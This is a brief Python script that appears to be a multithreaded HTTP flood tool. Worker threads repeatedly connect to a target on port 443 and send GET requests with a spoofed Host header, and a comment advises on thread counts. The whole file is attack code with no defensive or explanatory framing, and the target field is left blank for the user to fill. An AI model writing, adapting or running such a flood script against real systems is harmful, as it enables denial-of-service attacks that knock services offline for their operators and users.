
import socket
import threading

target = ''
fake_ip = '217.107.219.57'
port = 443
# check before how many cores you have and use about 25% of max thread available
max_threads = 5

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)

attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        print(attack_num)

        s.close()

for i in range(max_threads):
    thread = threading.Thread(target=attack)
    thread.start()
